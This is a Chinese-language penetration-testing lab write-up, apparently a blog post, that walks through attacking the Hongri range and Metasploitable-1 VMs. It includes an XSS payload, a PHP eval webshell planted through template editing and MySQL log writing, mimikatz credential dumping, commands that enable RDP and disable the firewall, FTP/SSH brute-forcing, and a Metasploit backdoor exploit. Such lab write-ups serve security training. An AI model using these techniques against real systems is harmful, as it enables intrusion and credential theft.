@@ -1,0 +1,301 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>标签: 内网打靶 - Sky&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Sky&#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Sky&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="hacker,黑客技术,信息安全,病毒分析,红队技术,CTF解题分享,应急响应,二进制安全，IOT，web安全,技术分享,WriteUp"><meta property="og:type" content="blog"><meta property="og:title" content="Sky&#039;s Blog"><meta property="og:url" content="https://flypigc.github.io/"><meta property="og:site_name" content="Sky&#039;s Blog"><meta property="og:description" content="hacker,黑客技术,信息安全,病毒分析,红队技术,CTF解题分享,应急响应,二进制安全，IOT，web安全,技术分享,WriteUp"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://flypigc.github.io/img/og_image.png"><meta property="article:author" content="Sky"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://flypigc.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://flypigc.github.io"},"headline":"Sky's Blog","image":["https://flypigc.github.io/img/og_image.png"],"author":{"@type":"Person","name":"Sky"},"publisher":{"@type":"Organization","name":"Sky's Blog","logo":{"@type":"ImageObject","url":"https://flypigc.github.io/img/logo.svg"}},"description":"hacker,黑客技术,信息安全,病毒分析,红队技术,CTF解题分享,应急响应,二进制安全，IOT，web安全,技术分享,WriteUp"}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/6.0.0/css/all.min.css"><link data-pjax rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/11.7.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><!--!--><!--!--><script data-ad-client="test" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" referrerpolicy="no-referrer" alt="Sky&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/flypigc/"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags/">标签</a></li><li class="is-active"><a href="#" aria-current="page">内网打靶</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-12-11T07:15:38.467Z" title="2025/12/11 15:15:38">2025-12-11</time>发表</span><span class="level-item"><time dateTime="2025-12-20T01:40:03.388Z" title="2025/12/20 09:40:03">2025-12-20</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a></span><span class="level-item">28 分钟读完 (大约4226个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2025/12/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA+METASPLOITABLE%E6%89%93%E9%9D%B6/">红日靶场+METASPLOITABLE打靶</a></p><div class="content"><span id="more"></span>
+
+<h1 id="红日靶场一"><a href="#红日靶场一" class="headerlink" title="红日靶场一"></a>红日靶场一</h1><p>先扫网段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PR -n 192.168.52.0/24</span><br></pre></td></tr></table></figure>
+
+<p><code>-sn</code>: 跳过端口扫描，只确认是否在线<br><code>-PR</code>: 使用基于 ARP 协议的主机扫描，内网首选<br><code>-n</code>: 不进行反向 DNS 解析，可提高扫描速度<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431655735-7d0d9f0e-829c-47e8-a36b-53484177f539.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<p>然后按级别到10<br>扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.10</span><br></pre></td></tr></table></figure>
+
+<p><code>-sS</code>: 使用 TCP SYN 半开放扫描 (必须使用 root 权限运行)<br><code>-sC</code>: 使用默认的脚本扫描，可扫描出更多信息 (比如网页标题)<br><code>-Pn</code>: 不进行活跃主机扫描，因为扫描对象已知是活跃主机<br><code>-n</code>: 不进行反向 DNS 解析，提高扫描速度<br><code>-sV</code>: 扫描服务版本信息<br><code>-p 1-65535</code>: 指定扫描的端口范围为所有 TCP 端口<br>80端口</p>
+<p>从上图可看出 <code>192.168.52.10</code> 主机开放了 <code>80</code> 端口，运行了 HTTP 服务，站点标题为 phpStudy，即使用小皮面板搭建的 web 站点。<br>浏览器访问 <code>http://192.168.1.10</code>，可以看到 phpinfo.php 文件被展示了出来，可被收集到大量 PHP 配置信息：<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431655894-68c6c523-d334-4039-9df1-87dc75a13f19.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<h4 id="2-1-3-站点目录扫描"><a href="#2-1-3-站点目录扫描" class="headerlink" title="2.1.3 站点目录扫描"></a>2.1.3 站点目录扫描</h4><p>使用 <a target="_blank" rel="noopener" href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly93d3cua2FsaS5vcmcvdG9vbHMvd2Z1enov">wfuzz</a> 来扫描 <code>http://192.168.52.10/</code> 的站点目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.52.10/FUZZ</span><br></pre></td></tr></table></figure>
+
+<p><code>-w /usr/share/wordlists/dirb/common.txt</code>: 指定 wfuzz 使用 kali 内置的常见目录和文件名字典文件来爆破<br><code>--hc 404</code>: hide code 404，即当返回状态码为 <a target="_blank" rel="noopener" href="https://blog.lololowe.com/posts/3419/#4%E5%BC%80%E5%A4%B4-%E8%AF%B7%E6%B1%82%E9%94%99%E8%AF%AF">404 (未找到)</a> 时，wfuzz 不显示该结果<br><code>192.168.52.10/FUZZ</code>: <code>FUZZ</code> 为占位符，字典文件中的每一行都会替换掉 <code>FUZZ</code>，并将替换后的 URL 发送给服务器，然后分析服务器的 <a target="_blank" rel="noopener" href="https://blog.lololowe.com/posts/3419/">http 状态码</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431655997-50e9fb4a-55c6-4432-9fe1-314dff5263a1.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<p>&#x2F;phpadmin<br>弱密码root.root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.52.10/beifen.rar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656100-b05f4ab2-d4f7-41a1-a44a-124e3f9f0c12.jpg" referrerpolicy="no-referrer" alt="null"></p>
+
+
+<p>这里直接告诉我们后台地址了<br>源码中也可以看到<br>因为直接拿源码了太简单了<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656182-9315841e-20c5-4b33-9923-3fa2d64b0165.jpg" referrerpolicy="no-referrer" alt="null"><br>在留言板<br>&#x2F;index.php?r&#x3D;default&#x2F;extend&#x2F;index&amp;id&#x3D;100023页面输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello admin!!</span><br><span class="line">&lt;script&gt;alert(&quot;hacker&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构成xss<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656285-f53f47da-1df7-426b-8dcc-b3ea8fb965a0.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<p>单击审核按钮，使该留言通过审核从而显示在留言板页面：<br>然后用户界面就会弹窗了</p>
+<p>yxcms 后台文件上传漏洞</p>
+<p>登录到 yxcms 的后台，进入” 前台模板”，管理模板文件并新建模板文件，名称为 <code>hack</code>, 内容为 php 一句话木马: <code>&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;</code>:<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656449-f265caf2-7383-4b34-bc5b-8b2d3f3ab706.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<p>但是不知道文件位置<br>这里我们直接去但是我们有源码可以知道这个页面其他文件的位置<br>yxcms\protected\apps\default\view\default</p>
+<p>得到文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.52.10/yxcms/protected/apps/default/view/default/HACK.php</span><br></pre></td></tr></table></figure>
+
+<p>然我们直接去antsword连接<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656687-43b51030-a33c-4dbc-8521-d01b6487091d.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<p>net session<br><code>net session</code> 命令的核心作用是展示 “会话连接”，具体能查到以下关键信息：</p>
+<ul>
+<li><p><strong>远程计算机名称 &#x2F; IP</strong>：显示哪个设备（比如另一台电脑、服务器）正在连接你的电脑。</p>
+</li>
+<li><p><strong>连接类型</strong>：通常是 “Microsoft Windows Network”，即通过 Windows 网络共享建立的连接。</p>
+</li>
+<li><p><strong>连接状态</strong>：显示连接是 “已建立” 还是 “断开” 等状态。</p>
+</li>
+<li><p><strong>登录用户名</strong>：显示远程设备用哪个账号登录到你的电脑（仅部分场景显示）。<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656773-0a7c8fe6-808f-44b8-b39a-defd149573f8.jpg" referrerpolicy="no-referrer" alt="null"></p>
+</li>
+</ul>
+<p>到phpadmin访问写一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&#x27;hack&#x27;]);?&gt;&quot; INTO OUTFILE &quot;C:\Users\Administrator\Desktop\phpStudy\WWW\hack.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656863-d95e048c-dc93-4d48-aa46-bc6a2dd729f0.jpg" referrerpolicy="no-referrer" alt="null"><br>命令执行后出现了报错，提示 MySQL 服务器配置了 <a target="_blank" rel="noopener" href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3phaWh1a2VqaS9hcnRpY2xlL2RldGFpbHMvMTE5ODIzNDk0">secure-file-priv</a> 选项，限制了该命令的执行，执行以下命令查询该选项的状态：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656958-8106f7c7-6f1a-4898-b185-1312bdedc109.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<p>从上图可知 <code>secure-file-priv</code> 选项被设置为了 <code>NULL</code>, MySQL 服务器会禁止文件导入与导出功能。尝试使用以下命令修改 <code>secure-file-priv</code> 选项的值为空字符，使其不做目录限制:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL secure_file_priv = &#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657046-d7799504-1990-47f8-b684-b90fce0138e0.jpg" referrerpolicy="no-referrer" alt="null"><br>现在该变量为只读，无法修改<br>尝试从 <a target="_blank" rel="noopener" href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTA3MzUxNDcvYXJ0aWNsZS9kZXRhaWxzLzgxODcxNTYw">MySQL 命令执行日志</a>下手，执行 <code>SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;</code>，查看命令执行日志开关和日志文件路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log=on;  </span><br><span class="line">SET GLOBAL general_log_file=&#x27;C:/Users/Administrator/Desktop/phpStudy/WWW/hack.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行会自动在命令后面加上注释提示返回结果。执行 <code>SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;</code> 手动验证一下：</p>
+<p>从上图可知修改成功。后面执行的所有 MySQL 命令都会被记录在网站根目录下的 <code>hack.php</code> 文件中 (只记录命令，不记录结果)，此时再执行以下命令将一句话木马记录到日志文件中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&#x27;hack&#x27;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="内网打靶"><a href="#内网打靶" class="headerlink" title="内网打靶"></a>内网打靶</h1><p>先传cs马🐎到服务器上，然后直接点鼠标就提权成功了</p>
+<p>这里我们接看密码<br>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657186-95875f83-c5c5-4b59-b3e9-1cfe323356cb.jpg" referrerpolicy="no-referrer" alt="null"><br>得到上图后直接去<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657293-3849bc53-b0c1-4d8c-8145-62aa3012d891.jpg" referrerpolicy="no-referrer" alt="null"><br>就得到了密码<br>从上图可以看到 <code>administrator</code> 用户的登录密码为 <code>admin123!</code>, 所属域为 <code>god</code>, 密码来源为 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> 工具。</p>
+<p>查询远程桌面控制 (RDP) 3389 端口是否启用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netstat -ano | findstr 3389</span><br></pre></td></tr></table></figure>
+
+<p>输出为空行，说明未启用，使用此命令开启 RDP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>操作成功，再次执行 <code>shell netstat -ano | findstr 3389</code> 验证结果：<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657391-68f32eeb-24c2-4f28-a559-aea2ceb8eb31.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<p>启用成功。<code>WIN+R</code> 打开运行窗口输入 <code>mstsc.exe</code> 回车打开 RDP 客户端程序，使用 <code>god/administrator</code> 用户连接服务器的远程桌面：<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657492-e853a423-e392-455e-949f-0ec1cad5efa4.jpg" referrerpolicy="no-referrer" alt="null"><br>这里是GOD\Administrator<br>发现连接失败，namp扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -n -p 3389 192.168.52.10</span><br></pre></td></tr></table></figure>
+
+
+<p>发现端口为 <a target="_blank" rel="noopener" href="https://blog.lololowe.com/posts/e650/#nmap%E4%B8%AD%E5%AF%B9%E7%AB%AF%E5%8F%A3%E7%8A%B6%E6%80%81%E7%9A%84%E5%AE%9A%E4%B9%89">filtered 被过滤状态</a>，说明可能存在防火墙拦截，执行 <code>shell netsh advfirewall show allprofiles</code> 命令查看防火墙状态：</p>
+<p>从上图可看到防火墙状态为打开且拦截了入站数据，执行 <code>shell netsh advfirewall set allprofiles state off</code> 命令尝试关闭服务器的防火墙 (或者执行此命令单独放行 RDP 流量 <code>netsh advfirewall firewall add rule name=&quot;Allow Remote Desktop&quot; action=allow dir=in protocol=TCP localport=3389</code>)：</p>
+<p>执行成功，再次验证配置：<code>shell netsh advfirewall show allprofiles</code></p>
+<p>连接成功，同时观察到桌面 (左上角) 上有 <a target="_blank" rel="noopener" href="https://blog.lololowe.com/posts/e650/">nmap</a> 应用程序。</p>
+<p>在 CS 中执行 <code>shell ipconfig</code></p>
+<p>从上图可看到服务器除了有和和攻击机同网段的 <code>192.168.52.10/24</code> 的外网 IP 以外，还有内网 IP<code>192.168.52.143/24</code>。<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657662-4ce8b1c2-e5f6-460d-9265-786693b493cb.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<p>继续在 CS 中使用服务器自带的 nmap 扫描内网有哪些活跃主机：<code>shell nmap -sn -PR -n 192.168.52.143/24</code>。<br>注意，此命令必须在 <code>Administrator</code> 用户的 beacon 控制台下执行，在 <code>System</code> 用户下无法执行，因为 <code>System</code> 用户无法正确读取到环境变量，除非使用命令的完整路径来执行，比如 <code>shell &quot;C:\Program Files (x86)\Nmap\nmap.exe&quot; -sn -PR -n 192.168.52.143/24</code>:</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657766-93c5ab18-05f2-4ae5-a11a-331ba91ce030.jpg" referrerpolicy="no-referrer" alt="null"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.1</span><br><span class="line">192.168.52.141</span><br><span class="line">192.168.52.254</span><br><span class="line">192.168.52.2</span><br><span class="line">192.168.52.138</span><br><span class="line">192.168.52.10</span><br><span class="line">192.168.52.143</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-1-6-域成员身份确定"><a href="#3-1-6-域成员身份确定" class="headerlink" title="3.1.6 域成员身份确定"></a>3.1.6 域成员身份确定</h4><p>由于前面已经确定 Win7 服务器所属域为 <code>god</code>, 因此另外两台活跃主机一定有一台是<a target="_blank" rel="noopener" href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM5NTczMC5odG1s">域控制器 DC</a>, 使用 <code>net view</code> 命令 (注意不要加 <code>shell</code> 前缀，否则结果不完整) 探测域内主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+
+
+<p>从上图可看到 <code>192.168.52.138</code> 的主机名为 <code>OWA</code>(全称应该是 Outlook Web App)，为主域控制器 PDC (Primary Domain Controller),<br><code>192.168.52.141</code> 的主机名为 <code>ROOT-TVI862UBEH</code>, 和 Win7 服务器一样同属于 <code>god</code> 域的域成员。</p>
+<p>命令执行完成后，CS 会自动将探测到的设备加入” 目标列表”(注意，图中的 <code>198.18.*.*</code> 为<a target="_blank" rel="noopener" href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly93d3cuaWFuYS5vcmcvYXNzaWdubWVudHMvaWFuYS1pcHY0LXNwZWNpYWwtcmVnaXN0cnkvaWFuYS1pcHY0LXNwZWNpYWwtcmVnaXN0cnkueGh0bWw">本地基准测试 IP</a>，在这里无实际意义，不必在意):</p>
+<h4 id="3-1-7-域成员端口扫描"><a href="#3-1-7-域成员端口扫描" class="headerlink" title="3.1.7 域成员端口扫描"></a>3.1.7 域成员端口扫描</h4><p>在 CS 的 <code>Administrator</code> 用户的 beacon 控制台中依次执行以下两条命令来分别扫描 <code>192.168.52.138</code> 和 <code>192.168.52.141</code> 两台主机的端口状态：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.138  </span><br><span class="line">shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p>从上面两张图片中可以看出这两台主机都开放了 SMB 协议的 <code>445</code> 端口，那么接下来可以尝试使用 CS 内置的 <code>psexec</code> 工具获取目标的 system shell。</p>
+<p>3.2 横向移动</p>
+<p>创建一个 SMB 监听器，名字为 <code>wxdx</code>，Payload 为 <code>Beacon SMB</code>：</p>
+<h1 id="METASPLOITABLE-1"><a href="#METASPLOITABLE-1" class="headerlink" title="METASPLOITABLE-1"></a>METASPLOITABLE-1</h1><p>kali攻击机，inet 172.20.10.4  netmask 255.255.255.240</p>
+<p>网段：172.20.10.0&#x2F;28</p>
+<p>METASPLOITABLE-1 靶机，<br>addr:172.20.10.3<br>Bcast:172.20.10.15<br>Mask:255.255.255.240</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475003-ec711144-9477-424f-bef1-be3d8dacf1ee.png" referrerpolicy="no-referrer" alt="null"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475063-1e0cfbac-2bb6-456e-9552-527b0234b8c6.png" referrerpolicy="no-referrer" alt="null"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 172.20.10.0/28 -i eth0</span><br></pre></td></tr></table></figure>
+
+<p>扫到IP</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475139-f35ae89b-ad65-4967-b632-60201876fc4f.png" referrerpolicy="no-referrer" alt="null"><br>nmap扫端口<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475200-1c9f5830-ec77-4c82-9f3f-96c90267e4a2.png" referrerpolicy="no-referrer" alt="null"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 172.20.10.3</span><br><span class="line">nmap -v -T4 -p- -A -oN nmap.log 172.20.10.3</span><br></pre></td></tr></table></figure>
+
+
+
+<p>扫目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch -u 172.20.10.3 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475251-d5561774-8fe0-4480-9477-92aad9a4f99a.png" referrerpolicy="no-referrer" alt="null"></p>
+<p>到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.20.10.3/tikiwiki</span><br></pre></td></tr></table></figure>
+
+<p>看看<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475300-2834e57d-6fd0-4efa-88f2-3f5c6e45eda2.png" referrerpolicy="no-referrer" alt="null"></p>
+<p>发现TikiWiki 1.9.5是存在RCE漏洞的</p>
+<h1 id="爆破FTP"><a href="#爆破FTP" class="headerlink" title="爆破FTP"></a>爆破FTP</h1><p>我们这里先尝试爆破一下ftp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra  -L  /home/kali/Desktop/user.txt  -P  /home/kali/Desktop/pass.txt  ftp://172.20.10.3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475352-08dec5a8-c76e-4983-a8a5-22f83ae50071.png" referrerpolicy="no-referrer" alt="null"><br><strong>已经成功爆破出 4 组有效的 FTP 账号和密码</strong>，具体信息如下：</p>
+<ul>
+<li><p>账号：<code>postgres</code>，密码：<code>postgres</code></p>
+</li>
+<li><p>账号：<code>user</code>，密码：<code>user</code></p>
+</li>
+<li><p>账号：<code>service</code>，密码：<code>service</code></p>
+</li>
+<li><p>账号：<code>msfadmin</code>，密码：<code>msfadmin</code></p>
+</li>
+</ul>
+<h1 id="爆破SSH"><a href="#爆破SSH" class="headerlink" title="爆破SSH"></a>爆破SSH</h1><p>九头蛇不知道为什么爆不出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 172.20.10.3 -U user.txt -P pass.txt -M ssh -n 22 -t 4 -v 4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475411-8c72e053-6f6f-4097-9de9-87e2ffa0b688.png" referrerpolicy="no-referrer" alt="null"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 172.20.10.3</span><br></pre></td></tr></table></figure>
+
+<p>输入用户名密码也是成功拿下权限</p>
+<h1 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h1><p>利用metasploit<br>然后启动msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口1：6637——-irc-3281-backdoor"><a href="#端口1：6637——-irc-3281-backdoor" class="headerlink" title="端口1：6637——-irc_3281_backdoor"></a>端口1：6637——-irc_3281_backdoor</h2><p>登录msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search irc</span><br></pre></td></tr></table></figure>
+
+<p>找到对应模块<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475477-d6f6665e-2830-4769-9276-429cbdbc1ffa.png" referrerpolicy="no-referrer" alt="null"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/irc/unreal_ircd_3281_backdoor</span><br></pre></td></tr></table></figure>
+
+<p>进入对应模块  查看配置 show options</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475535-a388982c-147a-408f-827c-0ac26ebb6553.png" referrerpolicy="no-referrer" alt="null"></p>
+<p>设置主机名 进行漏洞利用 exploit 利用，成功获取会话，root权限</p>
